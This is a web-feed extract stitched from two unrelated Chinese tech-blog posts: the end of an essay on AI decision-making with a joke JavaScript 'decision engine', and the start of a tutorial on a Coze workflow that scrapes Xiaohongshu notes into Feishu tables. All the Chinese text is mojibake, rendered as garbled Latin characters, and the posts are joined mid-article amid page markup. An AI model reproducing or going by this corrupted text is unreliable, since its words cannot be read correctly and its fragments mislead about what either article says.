<h2 data-id="heading-7">âš™ï¸ äº”ã€å®ç°å±‚ â€”â€” è®©æƒ³æ³•è½åœ°ï¼ˆç”¨JSå°æ¸¸æˆå±•ç¤ºå†³ç­–æµï¼‰</h2>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä¸€ä¸ªæç®€çš„â€œå¤šæ¨¡æ€AIå†³ç­–å¼•æ“â€ä¼ªå®ç°</span>
<span class="hljs-comment">// ï¼ˆåˆ«çœŸè·‘ï¼Œè¿™åªæ˜¯ç§‘ç ”å¹½é»˜ç‰ˆï¼‰</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">AIDecisionEngine</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">memory</span> = [];
  }

  <span class="hljs-comment">// æ¨¡æ‹Ÿå¤šæ¨¡æ€è¾“å…¥</span>
  <span class="hljs-title function_">perceive</span>(<span class="hljs-params">{ text, image, audio }</span>) {
    <span class="hljs-keyword">const</span> textFeature = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">encodeText</span>(text);
    <span class="hljs-keyword">const</span> imgFeature = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">encodeImage</span>(image);
    <span class="hljs-keyword">const</span> audFeature = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">encodeAudio</span>(audio);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">fuseFeatures</span>([textFeature, imgFeature, audFeature]);
  }

  <span class="hljs-title function_">encodeText</span>(<span class="hljs-params">text</span>) {
    <span class="hljs-keyword">return</span> text ? text.<span class="hljs-property">length</span> * <span class="hljs-number">0.618</span> : <span class="hljs-number">0</span>; <span class="hljs-comment">// é»„é‡‘æ¯”ä¾‹ä¹±å…¥</span>
  }

  <span class="hljs-title function_">encodeImage</span>(<span class="hljs-params">image</span>) {
    <span class="hljs-keyword">return</span> image ? <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">0.9</span> + <span class="hljs-number">0.1</span> : <span class="hljs-number">0</span>;
  }

  <span class="hljs-title function_">encodeAudio</span>(<span class="hljs-params">audio</span>) {
    <span class="hljs-keyword">return</span> audio ? audio.<span class="hljs-property">volumeLevel</span> / <span class="hljs-number">100</span> : <span class="hljs-number">0</span>;
  }

  <span class="hljs-title function_">fuseFeatures</span>(<span class="hljs-params">features</span>) {
    <span class="hljs-keyword">return</span> features.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b) / features.<span class="hljs-property">length</span>;
  }

  <span class="hljs-title function_">decide</span>(<span class="hljs-params">context</span>) {
    <span class="hljs-keyword">const</span> confidence = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">perceive</span>(context);
    <span class="hljs-keyword">if</span> (confidence &gt; <span class="hljs-number">0.6</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">"æ‰§è¡Œç§¯æç­–ç•¥ï¼ˆé¼“åŠ±ã€åˆ›ä½œï¼‰ğŸ¤–"</span>;
    <span class="hljs-keyword">if</span> (confidence &gt; <span class="hljs-number">0.3</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">"ä¸­æ€§å›åº”ï¼ˆåˆ†æã€å»ºè®®ï¼‰ğŸ§ "</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-string">"æ¶ˆæç­–ç•¥ï¼ˆå®‰æ…°ã€é™é»˜ï¼‰ğŸŒ™"</span>;
  }
}

<span class="hljs-comment">// æ¨¡æ‹ŸAIå®ä¾‹</span>
<span class="hljs-keyword">const</span> ai = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AIDecisionEngine</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ai.<span class="hljs-title function_">decide</span>({
  <span class="hljs-attr">text</span>: <span class="hljs-string">"å¤©æ°”å¥½æƒ³å“­"</span>,
  <span class="hljs-attr">image</span>: <span class="hljs-string">"grey_clouds.png"</span>,
  <span class="hljs-attr">audio</span>: { <span class="hljs-attr">volumeLevel</span>: <span class="hljs-number">20</span> }
}));
</code></pre>
<p>ğŸ§© è¾“å‡ºå¯èƒ½æ˜¯ï¼š</p>
<blockquote>
<p>â€œæ¶ˆæç­–ç•¥ï¼ˆå®‰æ…°ã€é™é»˜ï¼‰ğŸŒ™â€ï¼Œ<br/>
AI å†³å®šâ€œä¸æ‰“æ‰°ä½ â€ï¼Œè¿™å…¶å®æ˜¯æœ€æ¸©æŸ”çš„æ™ºèƒ½ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-8">ğŸ“ˆ å…­ã€å¯è¡Œæ€§åˆ†ææ€»ç»“</h2>









































<table><thead><tr><th align="left">æ¨¡å—</th><th align="center">æŠ€æœ¯æˆç†Ÿåº¦</th><th align="center">å®ç°å¯è¡Œæ€§</th><th align="left">æŒ‘æˆ˜</th></tr></thead><tbody><tr><td align="left">è¯­éŸ³è¯†åˆ«</td><td align="center">â­â­â­â­</td><td align="center">âœ…</td><td align="left">ç¯å¢ƒå™ªå£°ä¸å£éŸ³å·®å¼‚</td></tr><tr><td align="left">å›¾åƒç†è§£</td><td align="center">â­â­â­â­</td><td align="center">âœ…</td><td align="left">è¯­ä¹‰æ¨¡ç³Šã€æƒ…ç»ªç†è§£</td></tr><tr><td align="left">æ–‡æœ¬ç†è§£</td><td align="center">â­â­â­â­â­</td><td align="center">âœ…</td><td align="left">é•¿ä¸Šä¸‹æ–‡ä¸æ„å›¾æ­§ä¹‰</td></tr><tr><td align="left">å¤šæ¨¡æ€èåˆ</td><td align="center">â­â­â­</td><td align="center">âš ï¸éƒ¨åˆ†å¯è¡Œ</td><td align="left">ç‰¹å¾ç»Ÿä¸€ç©ºé—´å®šä¹‰</td></tr><tr><td align="left">AI è‡ªä¸»å†³ç­–</td><td align="center">â­â­</td><td align="center">ğŸš§ å‘å±•ä¸­</td><td align="left">å¯è§£é‡Šæ€§ä¸å®‰å…¨æ€§</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-9">ğŸ§­ ä¸ƒã€ç»“è¯­ï¼šAIçš„è‡ªç”±ï¼Œæºè‡ªæˆ‘ä»¬çš„çº¦æŸ</h2>
<p>AI è‡ªä¸»å†³ç­–çš„å®ç°ï¼Œ<br/>
å¹¶ä¸æ˜¯è®©æœºå™¨æ›¿æˆ‘ä»¬æ€è€ƒï¼Œ<br/>
è€Œæ˜¯è®©å®ƒ<strong>åœ¨è¾¹ç•Œå†…æ€è€ƒå¾—æ›´èªæ˜ã€æ›´äººç±»åŒ–ã€‚</strong></p>
<p>æœªæ¥ï¼Œç”¨æˆ·ä¹Ÿè®¸åªéœ€ç”¨å‡ å¥è¯ã€å‡ å¼ å›¾ã€å‡ å£°å¹æ¯ï¼Œ<br/>
å°±èƒ½å”¤èµ·ä¸€æ¬¾è½¯ä»¶çš„çµé­‚ã€‚<br/>
ä½†æˆ‘ä»¬ä»éœ€è®©å®ƒè®°ä½ï¼š</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ‰£å­ï¼ˆCozeï¼‰å®æˆ˜ï¼šå°çº¢ä¹¦ç¬”è®°å†…å®¹æ‰¹é‡é‡‡é›†åˆ°é£ä¹¦è¡¨æ ¼ï¼Œé…å›¾å¯ç›´æ¥é¢„è§ˆ]]></title>    <link>https://juejin.cn/post/7592483877987729414</link>    <guid>https://juejin.cn/post/7592483877987729414</guid>    <pubDate>2026-01-08T03:12:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592483877987729414" data-draft-id="7592483877987713030" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ‰£å­ï¼ˆCozeï¼‰å®æˆ˜ï¼šå°çº¢ä¹¦ç¬”è®°å†…å®¹æ‰¹é‡é‡‡é›†åˆ°é£ä¹¦è¡¨æ ¼ï¼Œé…å›¾å¯ç›´æ¥é¢„è§ˆ"/> <meta itemprop="keywords" content="Coze"/> <meta itemprop="datePublished" content="2026-01-08T03:12:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¾é³´"/> <meta itemprop="url" content="https://juejin.cn/user/3683842894347076"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ‰£å­ï¼ˆCozeï¼‰å®æˆ˜ï¼šå°çº¢ä¹¦ç¬”è®°å†…å®¹æ‰¹é‡é‡‡é›†åˆ°é£ä¹¦è¡¨æ ¼ï¼Œé…å›¾å¯ç›´æ¥é¢„è§ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3683842894347076/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¾é³´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:12:20.000Z" title="Thu Jan 08 2026 03:12:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å¾é³´ã€‚ä¸“æ³¨äºåˆ†äº«æå‡å·¥ä½œä¸ç”Ÿæ´»æ•ˆç‡çš„å·¥å…·ï¼Œæ— å¿åˆ†äº«AIé¢†åŸŸç›¸å…³çš„ç²¾é€‰æŠ¥å‘Šï¼ŒæŒç»­å…³æ³¨AIçš„å‰æ²¿åŠ¨å‘ã€‚</p>
<p>ä¹‹å‰åˆ†äº«è¿‡ä¸€ç¯‡é‡‡é›†å…¬ä¼—å·æ–‡ç« å†…å®¹åˆ°é£ä¹¦è¡¨æ ¼çš„æ–‡ç« â€”â€”ã€Š<a href="https://juejin.cn/post/7587729264184967231" target="_blank" title="https://juejin.cn/post/7587729264184967231">æ•ˆç‡ç¿»å€ï¼è‡ªåª’ä½“äººå¿…å¤‡ç¥å™¨ï¼šç”¨æ‰£å­(Coze)æ­å»ºä¸“å±ç´ æåº“ï¼Œå‘Šåˆ«çµæ„Ÿæ¯ç«­</a>ã€‹ï¼Œæ•™å¤§å®¶å¦‚ä½•å»ºè®¾ç´ æåº“ã€‚</p>
<p>ç´ æåº“ä»…ä»…æ˜¯å…¬ä¼—å·é‚£è¿˜è¿œè¿œä¸å¤Ÿï¼Œæ‰€ä»¥æœ¬æ–‡å°†ç»§ç»­åˆ†äº«å¦‚ä½•é‡‡é›†å°çº¢ä¹¦çš„ç¬”è®°å†…å®¹åˆ°é£ä¹¦è¡¨æ ¼ï¼Œä»¥ä¾¿åœ¨ä½ çœ‹åˆ°å¥½çš„ç¬”è®°çš„æ—¶å€™å¯ä»¥æ–¹ä¾¿çš„æŠŠå®ƒæ”¶é›†åˆ°ç´ æåº“ä¸­ï¼Œä»¥ä¾¿åç»­åˆ›ä½œå¯ä»¥ä»ç´ æåº“ä¸­æŸ¥æ‰¾çµæ„Ÿã€‚</p>
<p>åœ¨å¼€å§‹å·¥ä½œæµçš„è®²è§£ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹æ•ˆæœï¼Œæˆ‘åœ¨ä¸€ä¸ªé£ä¹¦å¤šç»´è¡¨æ ¼ä¸­æŠŠéœ€è¦é‡‡é›†ç´ æçš„ç¬”è®°é“¾æ¥æ·»åŠ åˆ°å¤šç»´è¡¨æ ¼ï¼Œç„¶åå†æŠŠå¤šç»´è¡¨æ ¼äº¤ç»™å·¥ä½œæµï¼Œè®©å®ƒè‡ªåŠ¨å®ç°ç¬”è®°å†…å®¹çš„é‡‡é›†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/52f8d1d58d6947ca9d8688c481b594ce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768446739&amp;x-signature=CN56i37d5zud8f2cdz1hIUdsGLg%3D" alt="" loading="lazy"/></p>
<p>é‡‡é›†åˆ°çš„å°çº¢ä¹¦ç¬”è®°å†…å®¹å­—æ®µæœ‰ï¼šæ ‡é¢˜ã€ç¬”è®°ç±»å‹ï¼ˆå›¾æ–‡ã€è§†é¢‘ï¼‰ã€ç‚¹èµæ•°ã€è¯„è®ºæ•°ã€æ”¶è—æ•°ã€åˆ†äº«æ•°ã€é…å›¾åˆ—è¡¨ã€è§†é¢‘åœ°å€ï¼ˆè§†é¢‘ç¬”è®°ï¼‰ã€æ ‡ç­¾åˆ—è¡¨ã€ä½œè€…ã€å‘æ–‡æ—¶é—´ã€å‘æ–‡ä½ç½®ã€æ–‡æ¡ˆå†…å®¹ã€‚</p>
<h2 data-id="heading-0">1. å®Œæ•´çš„å·¥ä½œæµç¨‹</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f63741e18de4277827ad9d0b273ec74~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768446739&amp;x-signature=2hCsFHE4DOf32F0E2eb9Knij6gI%3D" alt="" loading="lazy"/></p>
<p>1ã€è¯»å–é£ä¹¦è¡¨æ ¼ç¬”è®°é“¾æ¥ï¼šé€šè¿‡ä½¿ç”¨æ‰£å­å®˜æ–¹æ’ä»¶ä»é£ä¹¦å¤šç»´è¡¨æ ¼ä¸­è¯»å–æ•´ç†åˆ°çš„å°çº¢ä¹¦ç¬”è®°é“¾æ¥ã€‚</p>
<p>2ã€å°çº¢ä¹¦ç¬”è®°å†…å®¹è·å–ï¼šé€šè¿‡å°çº¢ä¹¦ç¬”è®°è¯¦æƒ…å†…å®¹è¯»å–å·¥å…·è¯»å–å°çº¢ä¹¦ç¬”è®°å†…å®¹ã€‚</p>
<p>3ã€ç¬”è®°æ•°æ®è½¬æˆé£ä¹¦è¡¨æ ¼æ ¼å¼ï¼šé€šè¿‡æŠŠè¯»å–åˆ°çš„å°çº¢ä¹¦ç¬”è®°å†…å®¹è½¬æˆé£ä¹¦è¡¨æ ¼éœ€è¦çš„æ ¼å¼ã€‚</p>
<p>4ã€ç¬”è®°æ•°æ®æ›´æ–°åˆ°é£ä¹¦è¡¨æ ¼ï¼šæŠŠè½¬åŒ–å¥½çš„å°çº¢ä¹¦ç¬”è®°å†…å®¹å†™å›é£ä¹¦è¡¨æ ¼ä¸­ã€‚</p>
<h2 data-id="heading-1">2. å·¥ä½œæµè¯¦ç»†èŠ‚ç‚¹è§£è¯»</h2>
<h3 data-id="heading-2">2.1. å¼€å§‹</h3>
<ul>
<li>api_tokenï¼šæ’ä»¶è®¤è¯ï¼Œå¯åå°å›å¤ã€èŠéº»å¼€é—¨ã€‘è”ç³»è·å–ï¼ˆæœ‰æ¡ä»¶ï¼‰</li>
<li>app_tokenï¼šé£ä¹¦å¤šç»´è¡¨æ ¼æ ‡è¯†</li>
<li>fs_app_idï¼šé£ä¹¦åº”ç”¨ID</li>
<li>fs_app_secretï¼šé£ä¹¦åº”ç”¨å¯†é’¥</li>
<li>table_nameï¼šé£ä¹¦å¤šç»´è¡¨æ ¼æ•°æ®è¡¨åç§°</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5717c73d44614b29b339fd6e8aa36b78~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768446739&amp;x-signature=nOrDOLsF6kg3laCuGQT93cg99vo%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-3">2.1.1. app_token&amp;table_name&amp;fs_app_id&amp;fs_app_secret å¦‚ä½•è·å–ï¼Ÿ</h4>
<p>è¿™å‡ ä¸ªå‚æ•°çš„è·å–æ–¹å¼å¯ä»¥æŸ¥çœ‹æˆ‘ä¹‹å‰å‘çš„æ–‡ç« â€”â€”ã€Šæ•ˆç‡ç¿»å€ï¼è‡ªåª’ä½“äººå¿…å¤‡ç¥å™¨ï¼šç”¨æ‰£å­(Coze)æ­å»ºä¸“å±ç´ æåº“ï¼Œå‘Šåˆ«çµæ„Ÿæ¯ç«­ã€‹ï¼Œè¿™é‡Œä¸å†è¯¦ç»†å±•å¼€ã€‚</p>
<h3 data-id="heading-4">2.2. è¯»å–è¡¨æ ¼æ•°æ®</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ç”¨æ¥è¯»å–é£ä¹¦è¡¨æ ¼ä¸­çš„æ•°æ®ï¼Œä½¿ç”¨åˆ°äº†æ‰£å­å®˜æ–¹çš„æ’ä»¶ã€é£ä¹¦å¤šç»´è¡¨æ ¼ã€‘çš„ã€search_recordã€‘å·¥å…·ï¼Œå‚æ•°å°±æŒ‰ç…§æˆ‘æˆªå›¾å¡«å†™å³å¯ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3356e6076360476abd56645b091b2a11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768446739&amp;x-signature=jy5cnPUE5UKFwYbT8xUwuhKi0MI%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">2.3. è·å–é£ä¹¦è®¤è¯</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ç”¨æ¥è·å–é£ä¹¦æ¥å£è®¤è¯ï¼Œä¾¿äºåé¢è°ƒç”¨æ¥å£ä¸Šä¼ å›¾ç‰‡åˆ°é£ä¹¦è¡¨æ ¼ä¸­ï¼Œä½¿ç”¨åˆ°äº†æ‰£å­ä¸‰æ–¹æ’ä»¶ã€é£ä¹¦å·¥å…·ç®±ã€‘çš„ã€tenant_access_tokenã€‘å·¥å…·ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d3fd5b26c36b42c28ddd60a054cdd2ff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768446739&amp;x-signature=vvXxy2jpX7VG5NRLw8z1prPgy6E%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-6">2.4. æ‰¹é‡è·å–ç´ æ</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ä½¿ç”¨åˆ°äº†æ‰£å­å®˜æ–¹çš„å¾ªç¯èŠ‚ç‚¹ï¼Œç”¨æ¥å¾ªç¯è·å–å°çº¢ä¹¦ç¬”è®°å†…å®¹ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9f8e715a163546c5b26a584586d6a681~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768446739&amp;x-signature=lzF2PpwD47ZZgip9yhnqGIHECpA%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-7">2.5. è·å–ç¬”è®°url</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ç”¨æ¥ä»è¯»å–åˆ°çš„é£ä¹¦å¤šç»´è¡¨æ ¼è®°å½•ä¸­è·å–ç¬”è®°çš„é“¾æ¥ï¼Œä½¿ç”¨åˆ°äº†æ‰£å­ä¸‰æ–¹æ’ä»¶ã€å­—ç¬¦ä¸²å·¥å…·åˆé›†ã€‘çš„ã€get_json_valueã€‘å·¥å…·ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd75c0cc05a345fc9b9649a0f78f4d38~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768446739&amp;x-signature=DovC3YfwD3%2B%2F%2BqoddIv50wz5Rlc%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-8">2.6. å°çº¢ä¹¦ç¬”è®°å†…å®¹è·å–</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ç”¨æ¥è¯»å–å°çº¢ä¹¦ç¬”è®°çš„å†…å®¹ï¼Œä¼šè¿”å›ç¬”è®°æ ‡é¢˜ã€é…å›¾ã€ä½œè€…ã€è§†é¢‘ã€å‘å¸ƒæ—¶é—´ç­‰å†…å®¹ï¼Œä½¿ç”¨åˆ°äº†æ‰£å­çš„ä¸‰æ–¹æ’ä»¶ã€å°çº¢ä¹¦å·¥å…·ç®±ã€‘çš„ã€get_xhs_note_detail_cookiesã€‘å·¥å…·ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7378e3de2d4408696b891a112d18cb6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768446739&amp;x-signature=CUbm1bJF3pYHpBO9ouu5kK0o9VE%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-9">2.7. æ‰¹é‡ä¸Šä¼ ç¬”è®°å›¾ç‰‡åˆ°é£ä¹¦è¡¨æ ¼</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ç”¨æ¥æŠŠé‡‡é›†åˆ°çš„ç¬”è®°å›¾ç‰‡ä¸Šä¼ åˆ°é£ä¹¦å¤šç»´è¡¨æ ¼ä¸­ï¼Œä»¥ä¾¿å¯ä»¥å½“ä½œè¡¨æ ¼çš„é™„ä»¶ç›´æ¥æµè§ˆï¼Œæ— éœ€è·³è½¬ï¼Œä½¿ç”¨åˆ°äº†æ‰£å­çš„ä¸‰æ–¹æ’ä»¶ã€é£ä¹¦å·¥å…·ç®±ã€‘çš„ã€batch_upload_mdediasã€‘å·¥å…·ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54c142a71f154476884798867025dd3b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768446739&amp;x-signature=TUGhhwBEjljykN587E2eHsoxmo8%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-10">2.8. ç¬”è®°å›¾è½¬æˆé£ä¹¦æ ¼å¼</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ç”¨æ¥æŠŠä¸Šä¼ åçš„å›¾ç‰‡è¿”å›çš„ç»“æœè½¬åŒ–æˆåç»­è¦ä½¿ç”¨åˆ°çš„é£ä¹¦è¡¨æ ¼çš„æ ¼å¼ï¼Œç”¨åˆ°äº†æ‰£å­ä¸‰æ–¹æ’ä»¶ã€é£ä¹¦å·¥å…·ç®±ã€‘çš„ã€upload_files_result_to_jsonã€‘å·¥å…·ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7423146e5ae24b948a094d629528dce0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768446739&amp;x-signature=EBOjgnZo2Qf%2B%2B5rVhUF4nNuKwqw%3D" alt="" loading="lazy"/></p>
